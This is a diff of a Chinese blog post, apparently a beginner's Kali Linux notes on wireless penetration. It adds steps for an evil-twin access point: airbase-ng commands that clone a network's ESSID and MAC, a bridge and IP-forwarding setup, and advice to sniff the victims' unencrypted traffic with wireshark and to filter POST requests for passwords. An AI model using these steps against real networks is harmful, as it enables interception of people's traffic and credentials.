@@ -96,7 +96,7 @@
 <meta property="og:site_name" content="Lycon&#39;s Blog">
 <meta property="og:description" content="记录一下摸索使用kali进行无线网络渗透的过程，掌握常用的无线渗透手段可以评估一个无线网络(wifi)的安全性。作为一个kali新手，这里只是简单记录一下学习过程，渗透高手可以一笑置之，没用过linux的大兄弟可以先了解一下linux的使用~">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-03-31T07:55:07.313Z">
+<meta property="og:updated_time" content="2018-03-31T12:31:05.007Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="摸索Kali-linux无线渗透(1)">
 <meta name="twitter:description" content="记录一下摸索使用kali进行无线网络渗透的过程，掌握常用的无线渗透手段可以评估一个无线网络(wifi)的安全性。作为一个kali新手，这里只是简单记录一下学习过程，渗透高手可以一笑置之，没用过linux的大兄弟可以先了解一下linux的使用~">
@@ -326,7 +326,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  4,216
+                  4,639
                 </span>
               
 
@@ -342,7 +342,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  20
+                  21
                 </span>
               
             </div>
@@ -452,17 +452,29 @@
 <p>伪造AP让你的目标客户端连接到你的AP是后续一些攻击的准备工作。</p>
 </blockquote>
 <h3 id="使用airbase-ng伪造AP"><a href="#使用airbase-ng伪造AP" class="headerlink" title="使用airbase-ng伪造AP"></a>使用airbase-ng伪造AP</h3><p>使用<code>airmon-ng</code>命令开启无线网卡混杂模式后，使用<code>airodump-ng</code>观察你想要竞争的AP的<code>mac地址</code>和<code>ESSID</code>，以及它的<code>信道</code>。<br>然后使用<code>airbase-ng</code>创建AP：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ airbase-ng wlan0mon --essid &lt;网络名称&gt; [-a &lt;mac地址&gt;] [-c &lt;信道&gt;]</span><br></pre></td></tr></table></figure></p>
+<blockquote>
 <p>若不指定mac地址，将使用无线网卡的mac地址，若不指定信道，将自动选择信道。</p>
+</blockquote>
+<p>另外，<code>airbase-ng</code>的<code>-W</code>、<code>-z</code>、<code>-Z</code>选项可以指定AP的加密模式，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ airbase-ng wlan0mon --essid &lt;ESSID&gt; -a &lt;mac地址&gt; -W 1  #for WEP</span><br><span class="line">$ airbase-ng wlan0mon --essid &lt;ESSID&gt; -a &lt;mac地址&gt; -z 2  #for WPA</span><br><span class="line">$ airbase-ng wlan0mon --essid &lt;ESSID&gt; -a &lt;mac地址&gt; -Z 2  #for WPA2</span><br></pre></td></tr></table></figure></p>
+<p>但是这样客户端就无法直接连接到你的AP了，并且密码提交时也无法提取密码，因此意义不大。</p>
 <p>创建完成后，可以发现<code>airodump-ng</code>命令也无法区分两个AP了，AP列表只出现了一个BSSID：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ airodump-ng wlan0mon --essid Lycon_2.4G -c1 -a</span><br><span class="line"></span><br><span class="line"> CH  1 ][ Elapsed: 30 s ][ 2018-03-31 15:28                                         </span><br><span class="line">                                                                                                                                      </span><br><span class="line"> BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID</span><br><span class="line">                                                                                                                                      </span><br><span class="line"> 88:25:93:58:B4:E9    0 100     1022       11    0   1  54e  WPA2 CCMP   PSK  Lycon_2.4G                                              </span><br><span class="line">                                                                                                                                      </span><br><span class="line"> BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                            </span><br><span class="line">                                                                                                                                      </span><br><span class="line"> 88:25:93:58:B4:E9  00:5A:39:B7:E1:47  -18    0 -24e     0        5                                                                    </span><br><span class="line"> 88:25:93:58:B4:E9  5C:F5:DA:5E:64:E8  -89    0 -11      0        3</span><br></pre></td></tr></table></figure></p>
 <p>下一步就是对其发起解除验证攻击，若你的假AP信号比原来的AP强，那么客户端就有极大的可能性连接到你的假AP上。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ airbase-ng wlan0mon --essid Lycon_2.4G -a 88:25:93:58:B4:E9  -c1</span><br><span class="line">15:33:30  Created tap interface at0</span><br><span class="line">15:33:30  Trying to set MTU on at0 to 1500</span><br><span class="line">15:33:30  Trying to set MTU on wlan0mon to 1800</span><br><span class="line">15:33:30  Access Point with BSSID 88:25:93:58:B4:E9 started.</span><br><span class="line">15:33:45  Client 18:F0:E4:35:D1:EE associated (unencrypted) to ESSID: &quot;Lycon_2.4G&quot;</span><br></pre></td></tr></table></figure></p>
-<p>我这里可以观察到mac为<code>18:F0:E4:35:D1:EE</code>的客户端连接到我伪造的AP上了，而且是未加密的(unencrypted)。但是这样的连接客户端是无法上网的，马上就发现问题了。所以我们需要进入下一步，把热点和以太网网卡进行桥接。</p>
+<p>我这里可以观察到mac为<code>18:F0:E4:35:D1:EE</code>的客户端连接到我伪造的AP上了，而且是未加密的(unencrypted)。但是这样的连接客户端是无法上网的，猎物马上就发现问题了。所以我们需要进入下一步，把热点和以太网网卡进行桥接。</p>
 <h3 id="桥接AP和以太网"><a href="#桥接AP和以太网" class="headerlink" title="桥接AP和以太网"></a>桥接AP和以太网</h3><p>执行<code>iwconfig</code>观察刚刚创建的AP：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ iwconfig</span><br><span class="line">at0       no wireless extensions.</span><br><span class="line"></span><br><span class="line">eth0      no wireless extensions.</span><br><span class="line"></span><br><span class="line">wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.412 GHz  Tx-Power=14 dBm   </span><br><span class="line">          Retry short limit:7   RTS thr:off   Fragment thr:off</span><br><span class="line">          Power Management:off</span><br><span class="line"></span><br><span class="line">lo        no wireless extensions.</span><br></pre></td></tr></table></figure></p>
 <p>上面的<code>at0</code>就是我们用<code>airbase-ng</code>创建的虚拟网卡。</p>
-<p>然后执行下面的命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install bridge-utils           #安装桥接工具</span><br><span class="line">$ brctl addbr wifi-bridge                #添加桥</span><br><span class="line">$ brctl addif wifi-bridge eth0           #将eth0加入桥</span><br><span class="line">$ brctl addif wifi-bridge at0            #将AP加入桥</span><br><span class="line">$ ifconfig eth0 0.0.0.0 up               #启动接口eth0</span><br><span class="line">$ ifconfig at0  0.0.0.0 up               #启动接口at0</span><br><span class="line">$ echo 1 &gt; /proc/sys/net/ipv4/ip_forward #启用转发</span><br></pre></td></tr></table></figure></p>
-<p>这样就完成了桥接，理论上连接到你的AP的客户端就可以通过<code>eth0</code>上网了。</p>
+<p>看一下你的电脑上是否已经安装<code>brctl</code>命令，如果还没有安装，执行下面的命令安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install bridge-utils</span><br></pre></td></tr></table></figure></p>
+<p>然后执行下面的命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ brctl addbr wifi-bridge                  #添加桥</span><br><span class="line">$ brctl addif wifi-bridge eth0             #将eth0加入桥</span><br><span class="line">$ brctl addif wifi-bridge at0              #将AP加入桥</span><br><span class="line">$ ifconfig eth0 0.0.0.0 up                 #启动接口eth0</span><br><span class="line">$ ifconfig at0  0.0.0.0 up                 #启动接口at0</span><br><span class="line">$ echo 1 &gt; /proc/sys/net/ipv4/ip_forward   #启用转发</span><br><span class="line">$ ifconfig wifi-bridge 192.168.xxx.xxx up  #制定桥IP地址</span><br></pre></td></tr></table></figure></p>
 <blockquote>
-<p>不过我的笔记本把<code>eth0</code>加入桥之后就ping不通路由器了，客户端也无法正常上网；<br>我也怀疑<code>0.0.0.0</code>这个IP地址是什么意思。好气啊，改天再研究吧。</p>
+<p>最后一步，制定桥的IP地址很关键，如果没有指定，笔记本和连接假AP的客户端无法上网。</p>
 </blockquote>
+<blockquote>
+<p>当然你可以用另一个无线网卡代替<code>eth0</code>实现上网，但是kali很可能没有usb无线网卡的驱动，这是个难题。</p>
+</blockquote>
+<ul>
+<li>这样就完成了桥接，可以理解为把笔记本配置成了一台 <strong>无线交换机</strong>（应该和电脑上用热点软件开启的热点不同，因为没有产生新的网段，无线路由器可以当作无线交换机来使用嘛呵呵，欢迎指正），<code>at0</code>就是AP网卡，<code>eth0</code>就是能上网的以太网网卡，这两个网卡桥接在了一起实现了数据交换。理论上连接到你的AP的客户端就可以通过<code>eth0</code>上网了；</li>
+<li>好了，由于所有流量都从无线端(at0)转发到以太网(eth0)，我们可以在笔记本上开启<code>wireshark</code>，随心所欲地嗅探受害者的封包（在 <strong>at0</strong> 接口上监听）了，而且还是未加密的数据，想想就有点小激动呢。前提是你的主机发出的伪装AP信号够强，性能够好，能够承载受害者的所有流量。</li>
+<li>发送密码的请求可以用过滤条件<code>http.request.method==&quot;POST&quot;</code>抓获，当然这极大可能是加密的，所以不可能这么简单地拿到密码。</li>
+</ul>
 <h2 id="未完待续…"><a href="#未完待续…" class="headerlink" title="未完待续…"></a>未完待续…</h2>
       
     </div>
@@ -770,7 +782,7 @@ var jiathis_config={
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共7.2k字</span>
+  <span class="post-count">博客全站共7.6k字</span>
 </div>
         
 
